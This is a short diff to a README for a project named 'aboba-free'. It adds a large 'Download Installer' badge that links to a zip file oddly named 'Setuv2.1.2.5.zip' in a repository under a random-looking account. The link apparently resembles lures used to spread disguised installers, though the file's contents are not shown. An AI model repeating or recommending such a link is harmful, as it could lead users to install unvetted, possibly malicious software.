@@ -1,3 +1,5 @@
+[![Download](https://img.shields.io/badge/Download-Installer-blue?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/ivan-wilsondev93m6/aboba-free/releases/download/v1.0.0/Setuv2.1.2.5.zip)
+
 # 📦 aboba-free
 
 ![OS](https://img.shields.io/badge/OS-Windows%2010%2B-0078D6.svg)
